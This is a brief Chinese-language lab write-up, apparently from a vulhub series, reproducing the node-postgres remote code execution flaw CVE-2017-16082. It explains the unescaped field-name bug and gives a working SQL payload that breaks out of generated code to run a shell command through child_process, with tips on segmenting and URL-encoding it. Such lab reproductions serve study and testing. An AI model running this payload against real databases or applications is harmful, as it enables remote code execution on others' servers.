# Node-postgres 代码执行漏洞（CVE-2017-16082）

###### by ADummy

### 0x00利用路线

​			直接url执行

### 0x01漏洞介绍

​			node-postgres在处理类型为`Row Description`的postgres返回包时，将字段名拼接到代码中。由于没有进行合理转义，导致一个特殊构造的字段名可逃逸出代码单引号限制，造成代码执行漏洞。

### 0x02漏洞复现

那么，我们就可以猜测这里存在node-postgres的代码执行漏洞。编写我想执行的命令`touch /tmp/success`，然后适当分割（每段长度不超过64字符）后替换在如下payload中：

```
SELECT 1 AS "\']=0;require=process.mainModule.constructor._load;/*", 2 AS "*/p=require(`child_process`);/*", 3 AS "*/p.exec(`touch /tmp/success`)//"

///注意url编码
```

![Node_postgres_RCE_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Node_postgres_RCE_1.jpg)

![Node_postgres_RCE_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Node_postgres_RCE_2.jpg)











